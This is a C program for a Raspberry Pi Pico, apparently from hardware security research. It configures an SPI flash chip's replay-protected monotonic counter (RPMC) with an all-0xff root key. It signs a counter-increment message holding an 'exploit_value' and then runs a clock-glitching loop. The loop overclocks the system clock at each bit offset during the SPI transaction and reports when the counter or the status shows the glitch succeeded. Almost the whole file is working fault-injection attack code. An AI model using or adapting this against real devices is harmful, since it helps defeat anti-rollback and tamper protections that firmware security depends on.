#include <stdio.h>
#include <stdint.h>
#include <stddef.h>
#include "pico/stdlib.h"
#include "pico/binary_info.h"
#include "pico/cyw43_arch.h"
#include "rpmc_ops.h"
#include "mbedtls/md.h"
#include "clock_spi.pio.h"
#include "hardware/pio.h"
#include "hardware/clocks.h"

struct pio_instance {
    PIO pio;
    unsigned int state_machine;
    int load_offset;
};

// Hopefully this can handle multithreading :)
struct pio_instance spi_pio_instance = {
    .pio = pio0,
    .state_machine = 0
};

#define NUM_COUNTERS 4

int __time_critical_func(pio_spi_write)(struct pio_instance * const spi, const uint8_t * src, const size_t len)
{
    size_t tx_remain = len;
    size_t rx_remain = len;

    // Do 8 bit accesses on FIFO, so that write data is byte-replicated. This
    // gets us the left-justification for free (for MSB-first shift-out)
    io_wo_8 *txfifo = (io_wo_8 *) &spi->pio->txf[spi->state_machine];
    io_ro_8 *rxfifo = (io_ro_8 *) &spi->pio->rxf[spi->state_machine];

    while (tx_remain > 0 || rx_remain > 0) {
        if (tx_remain > 0 && !pio_sm_is_tx_fifo_full(spi->pio, spi->state_machine)) {
            *txfifo = *src++;
            --tx_remain;
        }

        if (rx_remain > 0 && !pio_sm_is_rx_fifo_empty(spi->pio, spi->state_machine)) {
            (void) *rxfifo;
            --rx_remain;
        }
    }
}

int __time_critical_func(pio_spi_recieve)(struct pio_instance * const spi, const uint8_t write_placeholder, uint8_t * dest, const size_t len)
{
    size_t tx_remain = len;
    size_t rx_remain = len;

    // Do 8 bit accesses on FIFO, so that write data is byte-replicated. This
    // gets us the left-justification for free (for MSB-first shift-out)
    io_wo_8 *txfifo = (io_wo_8 *) &spi->pio->txf[spi->state_machine];
    io_ro_8 *rxfifo = (io_ro_8 *) &spi->pio->rxf[spi->state_machine];

    while (tx_remain > 0 || rx_remain > 0) {
        if (tx_remain > 0 && !pio_sm_is_tx_fifo_full(spi->pio, spi->state_machine)) {
            *txfifo = write_placeholder;
            --tx_remain;
        }

        if (rx_remain > 0 && !pio_sm_is_rx_fifo_empty(spi->pio, spi->state_machine)) {
            *dest++ = *rxfifo;
            --rx_remain;
        }
    }
}

static int get_all_counter_values(void * const spi_connection, const unsigned int cs_pin, const uint8_t hmac_key[RPMC_HMAC_KEY_LENGTH], uint32_t values[NUM_COUNTERS])
{
    for (uint8_t counter = 0; counter < NUM_COUNTERS; counter++) {
        if (get_counter_value(&spi_pio_instance, cs_pin, counter, hmac_key, values++)) {
            return 1;
        }
    }
    return 0;
}

static int loop(const unsigned int led_pin, const unsigned int cs_pin)
{
    const uint8_t root_key[RPMC_HMAC_KEY_LENGTH] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                                                    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                                                    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                                                    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    const uint8_t key_data[RPMC_KEY_DATA_LENGTH] = {0x00, 0x00, 0x00, 0x00}; 
    const uint8_t target_counter = 0;

    uint8_t hmac_key_register[RPMC_HMAC_KEY_LENGTH];
    if (mbedtls_md_hmac(mbedtls_md_info_from_type(MBEDTLS_MD_SHA256), root_key, RPMC_HMAC_KEY_LENGTH, key_data, RPMC_KEY_DATA_LENGTH, hmac_key_register)) {
        printf("Error: could not generate the hmac key\n");
        return 1;
    }
    
    for (uint8_t counter = 0; counter < NUM_COUNTERS; counter++) {
        if (update_hmac_key_register(&spi_pio_instance, cs_pin, counter, hmac_key_register, key_data)) {
            printf("Error: could not set initialize hmac key register\n");
            return 1;
        }
    }

    uint32_t old_counter_values[NUM_COUNTERS];
    if (get_all_counter_values(&spi_pio_instance, cs_pin, hmac_key_register, old_counter_values)) {
        printf("Error: could not get old counter values\n");
        return 1;
    }

    // sign the message
    const uint32_t exploit_value = 0;
    const size_t signature_offset = RPMC_OP1_MSG_HEADER_LENGTH + RPMC_COUNTER_LENGTH;
    unsigned char increment_msg[RPMC_INCREMENT_MONOTONIC_COUNTER_MSG_LENGTH] = {
        OP1_OPCODE, // Opcode
        0x02, // CmdType
        target_counter, // CounterAddr
        0, // Reserved
        (exploit_value >> 24) & 0xff,
        (exploit_value >> 16) & 0xff,
        (exploit_value >> 8) & 0xff,
        exploit_value & 0xff
    };
    if (mbedtls_md_hmac(mbedtls_md_info_from_type(MBEDTLS_MD_SHA256),
                        hmac_key_register,
                        RPMC_HMAC_KEY_LENGTH,
                        increment_msg,
                        signature_offset,
                        increment_msg + signature_offset)) {
        printf("Error: can't sign hmac increment counter message\n");
        return 1;
    };

    const uint32_t overclock_hz = 250U * 1000 * 1000;
    const uint32_t base_clocks_hz = clock_get_hz(clk_sys);

    printf("Starting glitch with overclock of %u hz:\n", overclock_hz);
    // This tries a clock glitch after every cycle
    for (size_t glitch_cycles = 0; glitch_cycles < RPMC_INCREMENT_MONOTONIC_COUNTER_MSG_LENGTH * 8 * 2; glitch_cycles++) {
        // Send this to clear any previous request results from the device
        // Without this glitching after 7 and 13 return successful status, because previous was successfull and command is not read correctly
        spi_transaction(&spi_pio_instance, cs_pin, increment_msg, RPMC_INCREMENT_MONOTONIC_COUNTER_MSG_LENGTH, NULL, 0);
        
        // There should be no current tranmission going on
        // Clear the fifos just in case
        pio_sm_clear_fifos(spi_pio_instance.pio, spi_pio_instance.state_machine);
        
        // Jump to exploit code and give it the cycles to glitch after
        pio_sm_exec(spi_pio_instance.pio, spi_pio_instance.state_machine, pio_encode_jmp(spi_pio_instance.load_offset + spi_with_setup_for_glitch_offset_setup_glitch));
        pio_sm_put_blocking(spi_pio_instance.pio, spi_pio_instance.state_machine, glitch_cycles);

        set_sys_clock_hz(overclock_hz, true);
        spi_transaction(&spi_pio_instance, cs_pin, increment_msg, RPMC_INCREMENT_MONOTONIC_COUNTER_MSG_LENGTH, NULL, 0);
        set_sys_clock_hz(base_clocks_hz, true);

        poll_until_finished(&spi_pio_instance, cs_pin);

        uint8_t status = get_rpmc_status(&spi_pio_instance, cs_pin);
        uint32_t new_counter_values[NUM_COUNTERS];
        if (get_all_counter_values(&spi_pio_instance, cs_pin, hmac_key_register, new_counter_values)) {
            printf("Error: could not get new counter values\n");
            return 1;
        }

        if (status == 0x80 || new_counter_values[target_counter] != old_counter_values[target_counter]) {
            printf("Glitch after %u cycles: Glitch was successfull status: 0x%02x\n", glitch_cycles, status);
            for (size_t counter = 0; counter < NUM_COUNTERS; counter++) {
                printf("                        counter %u %u -> %u\n", counter, old_counter_values[counter], new_counter_values[counter]);
            }
        } else if (status != 0x10) {
            printf("Glitch after %u cycles: Glitch had unexpected status 0x%02x\n", glitch_cycles, status);
        }
    }
    
    printf("Done\n");
    return 0;
}

static void pio_spi_init(PIO pio,
                         uint sm,
                         uint prog_offs,
                         uint n_bits,
                         float clkdiv,
                         uint pin_sck,
                         uint pin_mosi,
                         uint pin_miso)
{
    pio_sm_config c = spi_with_setup_for_glitch_program_get_default_config(prog_offs);

    sm_config_set_out_pins(&c, pin_mosi, 1);
    sm_config_set_in_pins(&c, pin_miso);
    sm_config_set_sideset_pins(&c, pin_sck);
    // Only support MSB-first in this example code (shift to left, auto push/pull, threshold=nbits)
    sm_config_set_out_shift(&c, false, true, n_bits);
    sm_config_set_in_shift(&c, false, true, n_bits);
    sm_config_set_clkdiv(&c, clkdiv);

    // MOSI, SCK output are low, MISO is input
    pio_sm_set_pins_with_mask(pio, sm, 0, (1u << pin_sck) | (1u << pin_mosi));
    pio_sm_set_pindirs_with_mask(pio, sm, (1u << pin_sck) | (1u << pin_mosi), (1u << pin_sck) | (1u << pin_mosi) | (1u << pin_miso));
    pio_gpio_init(pio, pin_mosi);
    pio_gpio_init(pio, pin_miso);
    pio_gpio_init(pio, pin_sck);

    // SPI is synchronous, so bypass input synchroniser to reduce input delay.
    hw_set_bits(&pio->input_sync_bypass, 1u << pin_miso);

    pio_sm_init(pio, sm, prog_offs, &c);
    pio_sm_set_enabled(pio, sm, true);
}

static inline float freq_to_clkdiv(uint32_t freq) {
    float div = (double)clock_get_hz(clk_sys) / (freq * PIO_SPI_CYCLES_PER_BIT);

    if (div < 1.0)
        div = 1.0;
    if (div > 65536.0)
        div = 65536.0;

    return div;
}

int main()
{
    stdio_init_all();
    sleep_ms(1000);
    printf("Device is starting\n");

    if (cyw43_arch_init()) {
        printf("Wi-Fi init failed\n");
        return 1;
    }

    spi_pio_instance.load_offset = pio_add_program(spi_pio_instance.pio, &spi_with_setup_for_glitch_program);
    if (spi_pio_instance.load_offset < 0) {
        printf("Error: could not add pio programm\n");
        return 1;
    }

    pio_spi_init(spi_pio_instance.pio,
                 spi_pio_instance.state_machine,
                 spi_pio_instance.load_offset,
                 8,
                 1.0, // run as fast as possible
                 PICO_DEFAULT_SPI_SCK_PIN, 
                 PICO_DEFAULT_SPI_TX_PIN, 
                 PICO_DEFAULT_SPI_RX_PIN);
    bi_decl(bi_1pin_with_name(PICO_DEFAULT_SPI_SCK_PIN, "SPI CLK"));
    bi_decl(bi_1pin_with_name(PICO_DEFAULT_SPI_TX_PIN, "SPI MOSI"));
    bi_decl(bi_1pin_with_name(PICO_DEFAULT_SPI_RX_PIN, "SPI MISO"));

    // Chip select is active-low, so we'll initialise it to a driven-high state
    gpio_init(PICO_DEFAULT_SPI_CSN_PIN);
    gpio_put(PICO_DEFAULT_SPI_CSN_PIN, 1);
    gpio_set_dir(PICO_DEFAULT_SPI_CSN_PIN, GPIO_OUT);
    // Make the CS pin available to picotool
    bi_decl(bi_1pin_with_name(PICO_DEFAULT_SPI_CSN_PIN, "SPI CS"));

    init_spi_transmission_function((int (*)(void *, uint8_t, const uint8_t *, size_t))pio_spi_recieve,
                                   (int (*)(void *, const uint8_t *, size_t))pio_spi_write);

    int ret = loop(CYW43_WL_GPIO_LED_PIN, PICO_DEFAULT_SPI_CSN_PIN);

    while (true)
        ;

    return ret;
}
